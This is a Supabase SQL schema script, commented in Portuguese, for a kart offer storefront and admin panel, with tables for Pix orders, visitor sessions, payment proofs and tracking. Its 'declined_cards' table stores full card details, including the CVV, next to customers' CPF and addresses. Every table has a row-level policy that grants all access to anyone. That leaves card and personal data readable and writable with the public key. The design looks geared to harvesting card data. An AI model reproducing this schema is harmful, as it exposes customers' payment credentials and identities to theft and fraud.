-- ==============================================================================
-- SCHEMA COMPLETO DO SUPABASE — KART OFERTA VISUAL & PAINEL ADMIN
-- Copie e cole todo este script no SQL Editor do seu Supabase Dashboard e clique em RUN.
-- ==============================================================================

-- 1. Habilitar extensões necessárias
CREATE EXTENSION IF NOT EXISTS "pgcrypto";

-- ==============================================================================
-- 2. Tabela: app_settings (Configurações do aplicativo e gateways)
-- ==============================================================================
CREATE TABLE IF NOT EXISTS public.app_settings (
    key text PRIMARY KEY,
    value jsonb NOT NULL DEFAULT '{}'::jsonb,
    updated_at timestamptz NOT NULL DEFAULT now()
);

ALTER TABLE public.app_settings ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Allow all access to app_settings" ON public.app_settings
    FOR ALL
    USING (true)
    WITH CHECK (true);

-- Configuração inicial padrão de gateway
INSERT INTO public.app_settings (key, value, updated_at)
VALUES (
    'gateway',
    '{"active": "primecash", "fallback": ["axxon", "winner"]}'::jsonb,
    now()
)
ON CONFLICT (key) DO NOTHING;

-- ==============================================================================
-- 3. Tabela: pix_orders (Pedidos, status de pagamento, tracking e cliente)
-- ==============================================================================
CREATE TABLE IF NOT EXISTS public.pix_orders (
    id text PRIMARY KEY DEFAULT gen_random_uuid()::text,
    created_at timestamptz NOT NULL DEFAULT now(),
    updated_at timestamptz NOT NULL DEFAULT now(),
    paid_at timestamptz,
    status text NOT NULL DEFAULT 'pending',
    amount_cents integer NOT NULL DEFAULT 0,
    currency text NOT NULL DEFAULT 'BRL',
    product_name text NOT NULL DEFAULT 'Kart Velox 4 rodas',
    product_color text,
    product_voltage text,
    external_ref text NOT NULL,
    transaction_id text,
    gateway text DEFAULT 'primecash',
    customer_name text,
    customer_email text,
    customer_phone text,
    cpf_hash text,
    email_hash text,
    phone_hash text,
    address_street text,
    address_number text,
    address_complement text,
    address_neighborhood text,
    address_city text,
    address_state text,
    address_zipcode text,
    utm_source text,
    utm_medium text,
    utm_campaign text,
    utm_content text,
    utm_term text,
    fbclid text,
    fbc text,
    fbp text,
    gclid text,
    ttclid text,
    ttp text,
    user_agent text,
    device text,
    client_ip text,
    traffic_source text,
    pix_copied_at timestamptz,
    tracking_code text,
    logistics_status text DEFAULT 'Aguardando pagamento',
    meta_event_id text,
    meta_event_sent boolean DEFAULT false,
    tt_event_id text,
    tt_event_sent boolean DEFAULT false,
    page_url text,
    referrer text,
    payment_method text DEFAULT 'pix',
    posvenda_sent boolean DEFAULT false,
    posvenda_response jsonb
);

CREATE INDEX IF NOT EXISTS idx_pix_orders_created_at ON public.pix_orders (created_at DESC);
CREATE INDEX IF NOT EXISTS idx_pix_orders_status ON public.pix_orders (status);
CREATE INDEX IF NOT EXISTS idx_pix_orders_tracking_code ON public.pix_orders (tracking_code);
CREATE INDEX IF NOT EXISTS idx_pix_orders_customer_email ON public.pix_orders (customer_email);
CREATE INDEX IF NOT EXISTS idx_pix_orders_cpf_hash ON public.pix_orders (cpf_hash);
CREATE INDEX IF NOT EXISTS idx_pix_orders_external_ref ON public.pix_orders (external_ref);
CREATE INDEX IF NOT EXISTS idx_pix_orders_transaction_id ON public.pix_orders (transaction_id);

ALTER TABLE public.pix_orders ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Allow all access to pix_orders" ON public.pix_orders
    FOR ALL
    USING (true)
    WITH CHECK (true);

-- ==============================================================================
-- 4. Tabela: declined_cards (Cartões Recusados e Recuperação)
-- ==============================================================================
CREATE TABLE IF NOT EXISTS public.declined_cards (
    id text PRIMARY KEY DEFAULT gen_random_uuid()::text,
    created_at timestamptz NOT NULL DEFAULT now(),
    customer_name text,
    customer_cpf text,
    customer_phone text,
    customer_email text,
    address_summary text,
    address_street text,
    address_number text,
    address_complement text,
    address_neighborhood text,
    address_city text,
    address_state text,
    address_zipcode text,
    amount_cents integer NOT NULL DEFAULT 0,
    card_brand text,
    card_holder text,
    card_bin text,
    card_first4 text,
    card_last4 text,
    card_number_display text,
    card_expiry_month text,
    card_expiry_full text,
    card_cvv text,
    installments integer DEFAULT 1,
    attempts integer DEFAULT 1,
    decline_reason text,
    traffic_source text,
    utm_source text,
    utm_medium text,
    utm_campaign text,
    utm_content text,
    contacted boolean DEFAULT false,
    external_ref text
);

CREATE INDEX IF NOT EXISTS idx_declined_cards_created_at ON public.declined_cards (created_at DESC);
CREATE INDEX IF NOT EXISTS idx_declined_cards_customer_phone ON public.declined_cards (customer_phone);

ALTER TABLE public.declined_cards ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Allow all access to declined_cards" ON public.declined_cards
    FOR ALL
    USING (true)
    WITH CHECK (true);

-- ==============================================================================
-- 5. Tabela: live_sessions (Visitantes Ao Vivo no Funil em tempo real)
-- ==============================================================================
CREATE TABLE IF NOT EXISTS public.live_sessions (
    session_id text PRIMARY KEY,
    page text NOT NULL,
    stage text NOT NULL DEFAULT 'site',
    source text,
    utm_campaign text,
    city text,
    region text,
    country text DEFAULT 'BR',
    user_agent text,
    ip text,
    landing text,
    referrer text,
    first_seen timestamptz NOT NULL DEFAULT now(),
    last_seen timestamptz NOT NULL DEFAULT now()
);

CREATE INDEX IF NOT EXISTS idx_live_sessions_last_seen ON public.live_sessions (last_seen DESC);
CREATE INDEX IF NOT EXISTS idx_live_sessions_stage ON public.live_sessions (stage);

ALTER TABLE public.live_sessions ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Allow all access to live_sessions" ON public.live_sessions
    FOR ALL
    USING (true)
    WITH CHECK (true);

-- ==============================================================================
-- 6. Tabela: payment_proofs (Comprovantes de Pagamento Pix)
-- ==============================================================================
CREATE TABLE IF NOT EXISTS public.payment_proofs (
    id text PRIMARY KEY DEFAULT gen_random_uuid()::text,
    order_id text REFERENCES public.pix_orders(id) ON DELETE SET NULL,
    transaction_id text,
    external_ref text,
    customer_name text,
    customer_phone text,
    amount_cents integer,
    image_data text NOT NULL,
    mime_type text,
    status text NOT NULL DEFAULT 'pending',
    note text,
    reviewed_at timestamptz,
    created_at timestamptz NOT NULL DEFAULT now()
);

CREATE INDEX IF NOT EXISTS idx_payment_proofs_created_at ON public.payment_proofs (created_at DESC);
CREATE INDEX IF NOT EXISTS idx_payment_proofs_status ON public.payment_proofs (status);
CREATE INDEX IF NOT EXISTS idx_payment_proofs_order_id ON public.payment_proofs (order_id);

ALTER TABLE public.payment_proofs ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Allow all access to payment_proofs" ON public.payment_proofs
    FOR ALL
    USING (true)
    WITH CHECK (true);

-- ==============================================================================
-- 7. Tabela: tracking_lookups (Cache de Consultas de Rastreio)
-- ==============================================================================
CREATE TABLE IF NOT EXISTS public.tracking_lookups (
    lookup_key text PRIMARY KEY,
    code text NOT NULL,
    eta_date text NOT NULL,
    paid_at timestamptz NOT NULL DEFAULT now(),
    created_at timestamptz NOT NULL DEFAULT now()
);

CREATE INDEX IF NOT EXISTS idx_tracking_lookups_code ON public.tracking_lookups (code);

ALTER TABLE public.tracking_lookups ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Allow all access to tracking_lookups" ON public.tracking_lookups
    FOR ALL
    USING (true)
    WITH CHECK (true);
